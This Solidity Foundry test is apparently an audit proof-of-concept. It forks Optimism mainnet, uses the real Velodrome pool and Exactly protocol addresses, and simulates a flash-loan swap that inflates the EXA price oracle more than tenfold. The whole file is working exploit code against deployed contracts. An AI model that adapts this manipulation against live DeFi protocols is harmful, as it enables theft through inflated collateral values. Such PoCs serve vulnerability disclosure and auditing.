// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.17;

import { Test } from "forge-std/Test.sol";
import { PriceFeedPool, IPool, ERC20, IPriceFeed } from "../contracts/PriceFeedPool.sol";
import { Auditor, Market } from "../contracts/Auditor.sol";
import "forge-std/console.sol";

interface IVelodromePool {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint256 reserve0, uint256 reserve1, uint256 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract PriceFeedFlashloanPoC is Test {
    // Real addresses on Optimism
    address constant AUDITOR = 0xaEb62e6F27BC103702E7BC879AE98bceA56f027E;
    address constant EXA = 0x1e925De1c68ef83bD98eE3E130eF14a50309C01B;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant USDC_E = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address constant VELO_POOL = 0xf3C45b45223Df6071a478851B9C17e0630fDf535;
    address constant WETH_FEED = 0x13e3Ee699D1909E989722E753853AE30b17e08c5;
    address constant MARKET_USDC = 0x81C9A7B55A4df39A9B7B5F781ec0e53539694873;

    PriceFeedPool priceFeedEXA;
    Auditor auditor = Auditor(AUDITOR);
    
    address attacker = address(0xbad);

    function setUp() public {
        vm.createSelectFork("https://mainnet.optimism.io");
        
        // Deploy the vulnerable PriceFeedPool pointing to real Velodrome pool
        // token1Based = true because WETH is token1 in the pool
        priceFeedEXA = new PriceFeedPool(IPool(VELO_POOL), IPriceFeed(WETH_FEED), true);
        
        vm.label(attacker, "Attacker");
        vm.label(VELO_POOL, "VelodromePool");
        vm.label(EXA, "EXA");
        vm.label(WETH, "WETH");
    }

    function test_C5_flashloanPriceManipulation() public {
        // 1. Initial State Check
        int256 initialPrice = priceFeedEXA.latestAnswer();
        console.log("Initial EXA Price (from Pool): $", uint256(initialPrice) / 1e8); // WETH_FEED has 8 decimals
        
        (uint256 r0, uint256 r1, ) = IVelodromePool(VELO_POOL).getReserves();
        console.log("Initial Pool Reserves - EXA: %s, WETH: %s", r0 / 1e18, r1 / 1e18);

        // 2. Simulate Attacker holding EXA as collateral
        // We will mock the Auditor's behavior or enter a real market if possible.
        // For simplicity, we'll just show the PriceFeed output and the potential impact on liquidity calculation.
        
        // 3. FLASHLOAN SWAP
        // Attacker gets a lot of WETH (simulating flashloan)
        uint256 flashAmount = 500 ether; 
        deal(WETH, attacker, flashAmount);
        
        vm.startPrank(attacker);
        ERC20(WETH).transfer(VELO_POOL, flashAmount);
        
        // Calculate how much EXA to get out (approximate to move the price)
        // Reserve0 = 381,914 EXA, Reserve1 = 23 WETH
        // After 500 WETH in, Reserve1 = 523 WETH.
        // k = 381914 * 23 = 8,784,022
        // New Reserve0 = k / 523 = 16,795 EXA
        // amountOut = 381914 - 16795 = 365,119 EXA
        uint256 amountOut = 350000 ether; // Conservative
        
        IVelodromePool(VELO_POOL).swap(amountOut, 0, attacker, "");
        vm.stopPrank();

        // 4. Final State Check
        int256 manipulatedPrice = priceFeedEXA.latestAnswer();
        console.log("Manipulated EXA Price: $", uint256(manipulatedPrice) / 1e8);
        
        (r0, r1, ) = IVelodromePool(VELO_POOL).getReserves();
        console.log("Final Pool Reserves - EXA: %s, WETH: %s", r0 / 1e18, r1 / 1e18);

        // 5. Verification
        assertTrue(manipulatedPrice > initialPrice * 10, "Price should increase by at least 10x");
        
        console.log("--- VULNERABILITY CONFIRMED (C5-REAL) ---");
        console.log("Price manipulation factor: %s.x", uint256(manipulatedPrice) / uint256(initialPrice));
    }
}
